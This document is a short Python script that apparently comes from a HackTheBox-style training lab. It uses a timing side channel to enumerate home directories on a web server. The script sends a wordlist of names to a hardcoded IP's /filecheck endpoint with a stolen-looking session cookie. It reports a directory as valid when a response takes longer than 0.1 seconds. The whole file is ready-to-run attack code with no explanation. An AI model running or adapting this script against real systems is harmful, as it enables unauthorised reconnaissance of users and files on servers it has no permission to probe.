import requests
import sys

URL = "http://83.136.254.254:49353/filecheck"
COOKIES = {
    "session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.Z0xYLA.POyHiRbPXXROivkkI-MYz0Kvq5M"
}
THRESHOLD_S = 0.1

def check_dir(directory, url, cookies, threshold_s):
    params = {
        "filepath": f"/home/{directory}/"
    }

    r = requests.get(url, params=params, cookies=cookies)

    if r.elapsed.total_seconds() > threshold_s:
        print(f"Valid Directory found: {directory} - time: {r.elapsed.total_seconds()}")

def check_dirs(dir_list_file, threshold_s):
    with open(dir_list_file, 'r') as file:
        directories = [line.strip() for line in file]

    for directory in directories:
        check_dir(directory, URL, COOKIES, threshold_s)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <dir_list_file>")
        sys.exit(1)

    DIR_LIST_FILE = sys.argv[1]
    check_dirs(DIR_LIST_FILE, THRESHOLD_S)
